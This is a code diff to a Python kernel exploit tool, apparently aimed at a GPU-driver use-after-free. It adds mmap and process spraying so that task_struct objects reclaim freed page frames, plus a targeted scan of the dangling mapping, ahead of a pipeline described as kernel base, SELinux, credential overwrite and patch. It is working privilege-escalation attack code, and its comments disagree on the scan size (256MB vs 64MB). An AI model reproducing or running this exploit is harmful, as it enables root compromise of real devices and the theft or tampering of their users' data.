@@ -15,16 +15,15 @@ import select
 import termios
 import tty
 
-# v4.1.11-mmap-spray: visible build tag. The "-mmap-spray"
-# suffix marks the addition of _python_mmap_spray() which
-# does 4000 MAP_FIXED anonymous pages right after the UAF
-# to force the freed GPU page frames back into the slab
-# allocator. v6.c does this in C; we replicate it in Python
-# via mmap+ctypes. Without mmap_spray, the freed pages sit
-# idle and our UAF VA never has any task_struct data in it.
-# This is THE missing piece that was causing matches=0 even
-# though UAF was triggered successfully.
-_BUILD_TAG = "v4.1.11-mmap-spray"
+# v4.1.12-uaf-scan: visible build tag. The "-uaf-scan"
+# suffix marks the AUTOPILOT fix where after UAF+mmap_spray
+# we now do (a) targeted UAF scan (256MB at UAF_START, not
+# 1GB WIDE) and (b) explicit cmd_spray(batch=20) right after
+# mmap_spray to ensure KETO0422 task_structs land on the
+# just-freed page frames. Previously the scanner was running
+# WIDE 1GB and missing the actual UAF region where the
+# dangling mapping lives. This is the v6.c flow replicated.
+_BUILD_TAG = "v4.1.12-uaf-scan"
 import datetime
 import fcntl
 import ctypes
@@ -4133,15 +4132,33 @@ class MemoryExplorerAI:
                         # our UAF VA never has anything in it.
                         n_sprayed = self._python_mmap_spray(
                             n_pages=4000)
+                        # v4.1.11: kick the AI learning workers
+                        # NOW to spray KETO0422 procs which will
+                        # claim the just-freed page frames for
+                        # their task_struct allocations. We
+                        # wait briefly to let them spawn.
+                        if hasattr(self, "cmd_spray") and \
+                                callable(self.cmd_spray):
+                            self.cmd_spray(batch=20)
+                            time.sleep(0.2)
                         if n_sprayed > 0:
                             self.live["last_msg"] = (
                                 f"AUTO: UAF + mmap_spray "
-                                f"{n_sprayed}pg (cycle {cycle})")
+                                f"{n_sprayed}pg + spray 20 "
+                                f"(cycle {cycle})")
                         else:
                             self.live["last_msg"] = (
                                 f"AUTO: UAF triggered but "
                                 f"mmap_spray failed "
                                 f"(cycle {cycle})")
+                        # v4.1.11: now scan the UAF range
+                        # directly (256MB, not 1GB WIDE). This
+                        # is the moment of truth — if the spray
+                        # reclaimed our freed pages, the scan
+                        # will find KETO0422 markers.
+                        if hasattr(self, "cmd_scan") and \
+                                callable(self.cmd_scan):
+                            self.cmd_scan()
                 # Run the full exploit pipeline (E — kbase → selinux → cred → patch)
                 self._run_exploit_pipeline()
             except Exception as e:
@@ -4722,6 +4739,21 @@ class MemoryExplorerAI:
             scan_hi = self.kernel_base + 0x4000000
             self.live["last_msg"] = (
                 f"SCANNING kdata 0x{scan_lo:x}..0x{scan_hi:x} (kbase known)")
+        elif self.exploit_chain.get("uaf_triggered", False):
+            # v4.1.12: UAF was triggered — scan the dangling
+            # mapping directly. The UAF freed GPU page frames
+            # are at 0x7001FF000 (UAF_START). After mmap_spray,
+            # task_structs from our spray procs should land
+            # in these pages. Scan this 64MB range (matches
+            # v6.c SCAN_SIZE=0x04000000). This is the most
+            # efficient scan — task_structs are 8KB and live
+            # clustered, so 64MB = 8192 candidate task_struct
+            # pages, plenty for our 20-100 spray procs.
+            scan_lo = self.uaf_start
+            scan_hi = self.uaf_start + 0x4000000  # 64MB
+            self.live["last_msg"] = (
+                f"SCANNING UAF 0x{scan_lo:x}..0x{scan_hi:x} "
+                f"(UAF triggered, mmap_spray done)")
         else:
             # v4.1: check if we have live spray PIDs. If yes,
             # use WIDE mode (scans kernel slab). If no, fall
